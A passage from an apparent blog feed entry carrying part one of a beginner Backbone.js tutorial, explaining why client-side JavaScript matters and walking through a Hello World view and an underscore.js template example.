<li><a href="/blog/2012/09/13/backbone-js-for-absolute-beginners-getting-started-part-4/">Backbone.js for absolute beginners - getting started (part 4: Routers)</a></li>
</ol>
<h1 id="Brief-Background">Brief Background<a href="#Brief-Background" class="headerlink" title="Brief Background"></a></h1><p><a href="#start">TL; DR</a>: You need to use JavaScript heavily in order to make responsive and interactive web applications. <a href="#start">Jump to this and get started.</a></p>
<p>The web application development process has been evolving over the years. In the beginning web applications were just static HTML pages, which required programmers to change the code (HTML, CSS, JS) in order to change the content. Later, in web 2.0, server side programming languages (like PHP, Ruby, Java, ‚Ä¶) were added to generate HTML pages dynamically based on user input and data stored in database. That was a huge improvement, and most of the pages served today use this approach. However, to provide the web site with even more responsiveness, speed, and enhanced user interaction, it requires bringing the logic closer to the client (browser).  There are a couple of languages that can run in the browsers besides JS, such as Java, Flash and others. However, these require extra plugins and are not as ubiquitous as JavaScript.</p>
<p>Web applications nowadays require heavy use of JavaScript to generate content on the fly. The user needn‚Äôt wait between requests and page refreshes. A lot of the logic/code that used to be on the server side is being moved to the client side. JS allows web sites to render only content that changes without needing to reload the full-page on every request. Examples of this kind of web applicqtion are Gmail, Pandora, Pinterest, Nokia Maps 3D and others.</p>
<p>A common problem with large JS web application developed is that they can become pretty messy really quickly. The lack of structure makes the code hard to maintain. This is where Backbone comes into play. It provides structure to organize the code and increase maintainability. Backbone is not the only framework like this; in fact, there are many JS frameworks that attempt to offer similar benefits, like Ember.js, Angular.js and so on. However, I choose Backbone because it‚Äôs one of the most widely used frameworks in its category. It has a vibrant community and it‚Äôs also being fully used in production for a considerable number of big companies like: Wal-Mart mobile, Groupon, Khan Academy, Pandora, Wordpress, Foursquare, and so on.</p>
<p><a id="start"></a></p>
<h1 id="BackboneJS-Overview">BackboneJS Overview<a href="#BackboneJS-Overview" class="headerlink" title="BackboneJS Overview"></a></h1><p><strong>Just enough to get started with Backbone.js</strong></p>
<p>Backbone.js has hard dependency on underscore.js and a soft dependency on jQuery. It‚Äôs made up of the following modules:</p>
<ul>
<li>Views</li>
<li>Events</li>
<li>Models</li>
<li>Collections</li>
<li>Routers</li>
</ul>
<p><strong>Shut up and show me the code!</strong></p>
<p>Alright! the way we are going to explore all of these modules is through examples. This is a practical tutorial that I wished I had it when I stared learning. This is a fat-free walkthrough of Backbone.js, as simple as possible, with all the code in one file for didactical purposes (no hidden magic tricks, all cards are on the table).</p>
<p>The first example is a ‚ÄòHello World‚Äô app in Backbone and the second is a ‚Äòto do‚Äô app. After working through these two example apps, you‚Äôll see every Backbone module and have a practical understanding about them.</p>
<h1 id="Hello-World-in-Backbone-js">Hello World in Backbone.js<a href="#Hello-World-in-Backbone-js" class="headerlink" title="Hello World in Backbone.js"></a></h1><p>You can follow along with this tutorial‚Äôs code in this <a href="https://github.com/amejiarosario/Backbone-tutorial/commits/" target="_blank" rel="noopener">repository</a>. Each feature implemented is a new commit, so you can easily see what changed in every step.</p>
<p><strong>Simple HTML5 and Backbone boilerplate</strong></p>
<p>To get started, download <a href="https://raw.github.com/amejiarosario/Backbone-tutorial/439ff34409dfc01adca7f9f96efcd726295f1aac/backbone-tutorial.html" target="_blank" rel="noopener">this simple html file</a>. This file  contains the libraries that you‚Äôll need (jQuery, Underscore.js, Backbone.js and Backbone-localStorage.js) and the placeholders for your HTML and JS code. Don‚Äôt worry about the libraries, we are going to explain them as we need them.</p>
<p>After downloading the aformentioned file, notice the HTML where your entire page will be built using Backbone.Views!</p>
<p>Your entire js app will be loaded here:</p>
<p><code>&lt;div id=&quot;container&quot;&gt;Loading...&lt;/div&gt;</code></p>
<h2 id="Backbone‚Äôs-Views">Backbone‚Äôs Views<a href="#Backbone‚Äôs-Views" class="headerlink" title="Backbone‚Äôs Views"></a></h2><p>Backbone‚Äôs Views are the equivalent of ‚Äòcontrollers‚Äô on MVC frameworks (like Ruby on Rails), if you are not familiar with MVC frameworks, that‚Äôs okay. Backbone‚Äôs Views glue together user events (clicks, pressed keys, etc.), render HTML views and templates, and interact with models which contains the data of the application.</p>
<p>Here is an example of a Backbone.view: READ THE CODE AND COMMENTS, then insert this code in the javascript block of the HTML file you downloaded.</p>
<figure class="highlight js"><figcaption><span>Simple Backbone.View</span><a href="https://raw.github.com/amejiarosario/Backbone-tutorial/0bf69185f4463a75cb2d5553f8d1ea197323ccff/backbone-tutorial.html" target="_blank" rel="noopener">Full Code</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> AppView = Backbone.View.extend(&#123;</span><br><span class="line">  <span class="comment">// el - stands for element. Every view has a element associate in with HTML</span></span><br><span class="line">  <span class="comment">//      content will be rendered.</span></span><br><span class="line">  el: <span class="string">'#container'</span>,</span><br><span class="line">  <span class="comment">// It's the first function called when this view it's instantiated.</span></span><br><span class="line">  initialize: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.render();</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// $el - it's a cached jQuery object (el), in which you can use jQuery functions</span></span><br><span class="line">  <span class="comment">//       to push content. Like the Hello World in this case.</span></span><br><span class="line">  render: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.$el.html(<span class="string">"Hello World"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h2 id="Test-the-app">Test the app<a href="#Test-the-app" class="headerlink" title="Test the app"></a></h2><p>After copying the code, open the html file by typing this in terminal: <code>open &lt;your file name&gt;.html</code> , refresh the browser and you should see the ‚ÄòHello World‚Äô message, right? Wait, if you‚Äôre just seeing the ‚ÄòLoading‚Ä¶‚Äô it‚Äôs because you need to initialize the view first.</p>
<p><code>var appView = new AppView();</code></p>
<p>Yay! You have your ‚ÄúHello Wold‚Äù in Backbone and an introduction to the View module. (Full code is <a href="https://raw.github.com/amejiarosario/Backbone-tutorial/0bf69185f4463a75cb2d5553f8d1ea197323ccff/backbone-tutorial.html" target="_blank" rel="noopener">here</a>)</p>
<h2 id="Backbone‚Äôs-Templates">Backbone‚Äôs Templates<a href="#Backbone‚Äôs-Templates" class="headerlink" title="Backbone‚Äôs Templates"></a></h2><p>Backbone has a utility/helper library called <a href="http://underscorejs.org/?utm_source=adrianmejia.com" target="_blank" rel="noopener">underscore.js</a> and you can use their template solution out of box. You can also use any other template solution that you want like <a href="https://github.com/janl/mustache.js" target="_blank" rel="noopener">mustache</a> or <a href="https://github.com/wycats/handlebars.js" target="_blank" rel="noopener">handlebars</a>. Let‚Äôs stick with _.js for simplicity‚Äôs sake.</p>
<p>_.js templates have the following syntax,</p>
<p><code>_.template(templateString, [data], [settings])</code></p>
<p>where in the <code>templateString</code> you use the place holder <code>&lt;%= %&gt;</code> and <code>&lt;%- %&gt;</code> to dynamically insert data. The later allows for HTML escape while the first one doesn‚Äôt. Moreover, you can use <code>&lt;% %&gt;</code> to run any javascript code.</p>
<p>Let‚Äôs see it in action and rewrite our ‚ÄúHello World‚Äù using a _.js template instead.</p>
<figure class="highlight js"><figcaption><span>Simple Backbone.View and Templates</span><a href="https://raw.github.com/amejiarosario/Backbone-tutorial/c5b131278ecde92f33882c9a2c22ee4119e57d77/backbone-tutorial.html" target="_blank" rel="noopener">Full Code</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> AppView = Backbone.View.extend(&#123;</span><br><span class="line">  el: $(<span class="string">'#container'</span>),</span><br><span class="line">  <span class="comment">// template which has the placeholder 'who' to be substitute later</span></span><br><span class="line">  template: _.template(<span class="string">"&lt;h3&gt;Hello &lt;%= who %&gt;&lt;/h3&gt;"</span>),</span><br><span class="line">  initialize: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.render();</span><br><span class="line">  &#125;,</span><br><span class="line">  render: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// render the function using substituting the varible 'who' for 'world!'.</span></span><br><span class="line">    <span class="keyword">this</span>.$el.html(<span class="keyword">this</span>.template(&#123;<span class="attr">who</span>: <span class="string">'world!'</span>&#125;));</span><br><span class="line">    <span class="comment">//***Try putting your name instead of world.</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> appView = <span class="keyword">new</span> AppView();</span><br></pre></td></tr></table></figure>
<p>Run the app again and verify that it‚Äôs working with the template.</p>
<h1 id="What‚Äôs-next">What‚Äôs next?<a href="#What‚Äôs-next" class="headerlink" title="What‚Äôs next?"></a></h1><p>Continue with the <a href="/blog/2012/09/13/backbone-js-for-absolute-beginners-getting-started-part-2/">2nd part</a> and learn more about Backbone‚Äôs Models, Collections, View and Events!</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Backbone.js is a JavaScript library, among many others, that is gaining special attention in the web development community because it‚Äôs ease of use and the structure that it provides to JavaScript applications.&lt;/p&gt;
&lt;p&gt;Notice that BackboneJS is not a framework but a library. The difference is who is in control. Using a library YOU are in control, but using a framework there is an inversion of control: the framework calls you. Libraries give you a lot of flexibility, while frameworks has opinionated ways of doing things but can save you writing boiler plate code. Follow my &lt;a href=&quot;/blog/categories/angularjs/&quot;&gt;AngularJS&lt;/a&gt; tutorial series for a framework solution.&lt;/p&gt;
&lt;p&gt;Let‚Äôs dive into BackboneJS! and see how this flexible library can bring order to your Javascript!&lt;/p&gt;
    
    </summary>
    
      <category term="Technologies" scheme="https://adrianmejia.com/categories/Technologies/"/>
    
      <category term="Web Development" scheme="https://adrianmejia.com/categories/Technologies/Web-Development/"/>
    
    
      <category term="javascript" scheme="https://adrianmejia.com/tags/javascript/"/>
    
      <category term="backbonejs" scheme="https://adrianmejia.com/tags/backbonejs/"/>
    
      <category term="tutorial_backbonejs" scheme="https://adrianmejia.com/tags/tutorial-backbonejs/"/>
    
  </entry>
  
</feed>
